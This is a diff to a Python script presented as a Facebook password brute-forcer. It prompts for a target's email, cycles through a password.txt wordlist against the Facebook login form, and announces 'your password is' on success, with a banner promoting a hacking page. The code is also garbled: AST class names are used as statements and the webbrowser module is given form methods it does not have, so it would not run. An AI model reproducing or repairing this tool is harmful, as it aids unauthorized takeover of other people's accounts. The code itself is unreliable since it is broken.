@@ -1,3 +1,13 @@
+import sys 
+import os
+
+
+try:
+    import tokenize
+    
+except:
+    print('\n\tplease do install tokenize\n')
+sys.exit 
 import code
 import fileinput
 from socket import timeout
@@ -6,6 +16,7 @@ from argparse import FileType
 from ast import Break, Continue, If, Try
 from math import pi
 from tokenize import String
+import webbrowser
 import urllib
 from nturl2path import url2pathname
 import time
@@ -23,14 +34,13 @@ print('| __| | _ )   | _ ) | _ \ | | | | |_   _| | __|   \ \ / / | __| | _ \   |
 print('| _|  | _ \   | _ \ |   / | |_| |   | |   | _|     \ V /  | _|  |   /    / /   _    / /') 
 print('|_|   |___/   |___/ |_|_\  \___/    |_|   |___|     \_/   |___| |_|_\   /___| (_)  /_/')
 print('FOLLOW US ON FB:www.facebook.com/cyberhacks6')
-print('GOD BLESS NIGERIA')
 sfile=open('password.txt','r')
 
 def login( email, password):
     urlopen = 'https://www.facebook.com/login.php'
     header = {'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'}
-email=input.str("input target email/username:").strip()
-print("trying passwords with target email: " ,email)
+email = input("enter email of target:")
+print("attack will start soon please be sure the email input is correct",email +"i")
 i=0
 while FileType :
     password=fileinput.readline().strip()
@@ -38,14 +48,14 @@ while FileType :
 if len(password) < 10:
    Continue
    print=str(i) +" : ",password
-response = browser.open(urlopen);
+response = webbrowser.open(urlopen);
 
 Try;
 If; response; code == 200
-browser.select_form(nr=o)
-browser.form['email']=email
-browser.form['pass']=password
-response = browser.submit()
+webbrowser.select_form(nr=o)
+webbrowser.form['email']=email
+webbrowser.form['pass']=password
+response = webbrowser.submit()
 response_data = response.read()
 'find friends' in response_data or 'two-factor authentication' in response_data or 'security code' in response_data;
 print('your password is : ',password)
